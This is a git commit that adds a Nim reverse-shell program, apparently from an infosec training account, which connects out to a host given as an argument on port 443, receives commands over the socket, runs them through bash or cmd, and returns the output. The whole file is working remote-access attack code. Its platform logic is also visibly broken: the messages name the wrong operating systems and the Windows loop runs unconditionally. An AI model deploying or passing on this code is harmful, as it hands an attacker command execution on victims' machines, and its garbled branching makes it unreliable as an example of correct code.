eae61334ce1982835e908e7d6ad891aeb9083703
Infosecbootcamp <160297994+Infosecbootcamp@users.noreply.github.com>
2025-08-16 15:45:21 -0500

    Create reverse-shell.nim

---
+++ reverse-shell.nim
@@ -0,0 +1,55 @@
+
+
+
+import os, net, osproc
+
+
+var 
+    sock = newSocket()
+
+proc run(TARGET: string, RPORT: int): void =
+    
+    
+    when system.hostOS == "macosx":
+        echo "running on Windows!"
+
+
+        try:
+            sock.connect(TARGET, PORT(RPORT))
+
+            while true:
+                let cmd = sock.recvLine()
+                if cmd == "exit":
+                    break
+                let result = execProcess("bash -c " & cmd)
+                sock.send(result)
+        except:
+            raise
+        finally:
+            sock.close
+
+    when system.hostOS == "windows":
+        echo "running on Mac OS X!"
+
+
+    try:
+        sock.connect(TARGET, PORT(RPORT))
+
+        while true:
+            let cmd = sock.recvLine()
+            if cmd == "exit":
+                break
+            let result = execProcess("cmd /c " & cmd)
+            sock.send(result)
+    except:
+        raise
+    finally:
+        sock.close
+
+when isMainModule:
+  try: 
+    let RPORT = 443
+    let TARGET = paramStr(1)
+    run(TARGET, RPORT)
+  except:
+    raise
